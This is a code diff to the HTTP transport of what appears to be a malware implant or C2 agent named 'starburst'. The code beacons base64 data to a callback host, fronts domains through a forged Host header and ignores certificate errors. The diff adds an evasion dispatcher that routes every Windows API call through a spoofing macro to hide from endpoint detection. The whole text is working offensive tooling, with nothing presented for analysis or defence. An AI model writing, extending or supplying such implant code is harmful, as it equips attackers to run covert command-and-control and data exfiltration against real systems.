@@ -3,6 +3,7 @@
 #include <base64.h>
 #include <crypto.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
 
@@ -12,7 +13,7 @@ using namespace starburst;
 auto declfn starburst::http_init(
     _Inout_ instance& inst
 ) -> bool {
-    inst.h_session = inst.winhttp.WinHttpOpen(
+    inst.h_session = (HINTERNET)SCALL( inst, winhttp.WinHttpOpen,
         symbol<LPCWSTR>( L"Mozilla/5.0" ),
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
@@ -21,18 +22,18 @@ auto declfn starburst::http_init(
     );
 
     if ( !inst.h_session ) {
-        DBG_PRINT( inst, "WinHttpOpen failed: %d\n", inst.kernel32.GetLastError() );
+        DBG_PRINT( inst, "WinHttpOpen failed: %d\n", (DWORD)SCALL( inst, kernel32.GetLastError ) );
         return false;
     }
 
     wchar_t wide_host[256] = { 0 };
-    inst.kernel32.MultiByteToWideChar(
+    SCALL( inst, kernel32.MultiByteToWideChar,
         CP_ACP, 0,
         inst.transport.callback_host, -1,
         wide_host, 256
     );
 
-    inst.h_connect = inst.winhttp.WinHttpConnect(
+    inst.h_connect = (HINTERNET)SCALL( inst, winhttp.WinHttpConnect,
         inst.h_session,
         wide_host,
         inst.transport.callback_port,
@@ -40,7 +41,7 @@ auto declfn starburst::http_init(
     );
 
     if ( !inst.h_connect ) {
-        DBG_PRINT( inst, "WinHttpConnect failed: %d\n", inst.kernel32.GetLastError() );
+        DBG_PRINT( inst, "WinHttpConnect failed: %d\n", (DWORD)SCALL( inst, kernel32.GetLastError ) );
         return false;
     }
 
@@ -109,12 +110,12 @@ auto declfn starburst::http_send(
         uri[0] = '/';
         str_copy( uri + 1, inst.transport.post_uri );
 
-        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, uri, -1, wide_uri, 256 );
+        SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, uri, -1, wide_uri, 256 );
     }
 
     DWORD flags = inst.transport.use_ssl ? WINHTTP_FLAG_SECURE : 0;
 
-    HINTERNET h_request = inst.winhttp.WinHttpOpenRequest(
+    HINTERNET h_request = (HINTERNET)SCALL( inst, winhttp.WinHttpOpenRequest,
         inst.h_connect,
         symbol<LPCWSTR>( L"POST" ),
         wide_uri,
@@ -125,7 +126,7 @@ auto declfn starburst::http_send(
     );
 
     if ( !h_request ) {
-        DBG_PRINT( inst, "WinHttpOpenRequest failed: %d\n", inst.kernel32.GetLastError() );
+        DBG_PRINT( inst, "WinHttpOpenRequest failed: %d\n", (DWORD)SCALL( inst, kernel32.GetLastError ) );
         inst.heap_free( b64_data );
         return false;
     }
@@ -136,19 +137,19 @@ auto declfn starburst::http_send(
                           SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                           SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                           SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-        inst.winhttp.WinHttpSetOption( h_request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags) );
+        SCALL( inst, winhttp.WinHttpSetOption, h_request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags) );
     }
 
 #if defined( HTTPX_TRANSPORT )
     // apply custom headers from HTTPX profile
     if ( inst.transport.custom_headers_len > 0 ) {
         wchar_t wide_headers[1024] = { 0 };
-        inst.kernel32.MultiByteToWideChar(
+        SCALL( inst, kernel32.MultiByteToWideChar,
             CP_ACP, 0,
             inst.transport.custom_headers, -1,
             wide_headers, 1024
         );
-        inst.winhttp.WinHttpAddRequestHeaders(
+        SCALL( inst, winhttp.WinHttpAddRequestHeaders,
             h_request, wide_headers, -1,
             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
         );
@@ -160,15 +161,15 @@ auto declfn starburst::http_send(
         char host_hdr[512] = { 0 };
         str_copy( host_hdr, symbol<char*>( const_cast<char*>( "Host: " ) ) );
         str_concat( host_hdr, inst.transport.domain_front );
-        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_hdr, -1, wide_host_hdr, 512 );
-        inst.winhttp.WinHttpAddRequestHeaders(
+        SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, host_hdr, -1, wide_host_hdr, 512 );
+        SCALL( inst, winhttp.WinHttpAddRequestHeaders,
             h_request, wide_host_hdr, -1,
             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
         );
     }
 #endif
 
-    BOOL sent = inst.winhttp.WinHttpSendRequest(
+    BOOL sent = (BOOL)SCALL( inst, winhttp.WinHttpSendRequest,
         h_request,
         WINHTTP_NO_ADDITIONAL_HEADERS, 0,
         b64_data, b64_len,
@@ -179,14 +180,14 @@ auto declfn starburst::http_send(
     inst.heap_free( b64_data );
 
     if ( !sent ) {
-        DBG_PRINT( inst, "WinHttpSendRequest failed: %d\n", inst.kernel32.GetLastError() );
-        inst.winhttp.WinHttpCloseHandle( h_request );
+        DBG_PRINT( inst, "WinHttpSendRequest failed: %d\n", (DWORD)SCALL( inst, kernel32.GetLastError ) );
+        SCALL( inst, winhttp.WinHttpCloseHandle, h_request );
         return false;
     }
 
-    if ( !inst.winhttp.WinHttpReceiveResponse( h_request, nullptr ) ) {
-        DBG_PRINT( inst, "WinHttpReceiveResponse failed: %d\n", inst.kernel32.GetLastError() );
-        inst.winhttp.WinHttpCloseHandle( h_request );
+    if ( !SCALL( inst, winhttp.WinHttpReceiveResponse, h_request, nullptr ) ) {
+        DBG_PRINT( inst, "WinHttpReceiveResponse failed: %d\n", (DWORD)SCALL( inst, kernel32.GetLastError ) );
+        SCALL( inst, winhttp.WinHttpCloseHandle, h_request );
         return false;
     }
 
@@ -200,7 +201,7 @@ auto declfn starburst::http_send(
 
     while ( true ) {
         available = 0;
-        if ( !inst.winhttp.WinHttpQueryDataAvailable( h_request, &available ) ) break;
+        if ( !SCALL( inst, winhttp.WinHttpQueryDataAvailable, h_request, &available ) ) break;
         if ( available == 0 ) break;
 
         if ( resp_size + available > resp_cap ) {
@@ -211,11 +212,11 @@ auto declfn starburst::http_send(
         }
 
         read = 0;
-        inst.winhttp.WinHttpReadData( h_request, resp_buf + resp_size, available, &read );
+        SCALL( inst, winhttp.WinHttpReadData, h_request, resp_buf + resp_size, available, &read );
         resp_size += read;
     }
 
-    inst.winhttp.WinHttpCloseHandle( h_request );
+    SCALL( inst, winhttp.WinHttpCloseHandle, h_request );
 
     if ( !resp_buf || resp_size == 0 ) return false;
 
@@ -288,11 +289,11 @@ auto declfn starburst::http_destroy(
     _Inout_ instance& inst
 ) -> void {
     if ( inst.h_connect ) {
-        inst.winhttp.WinHttpCloseHandle( inst.h_connect );
+        SCALL( inst, winhttp.WinHttpCloseHandle, inst.h_connect );
         inst.h_connect = nullptr;
     }
     if ( inst.h_session ) {
-        inst.winhttp.WinHttpCloseHandle( inst.h_session );
+        SCALL( inst, winhttp.WinHttpCloseHandle, inst.h_session );
         inst.h_session = nullptr;
     }
 }
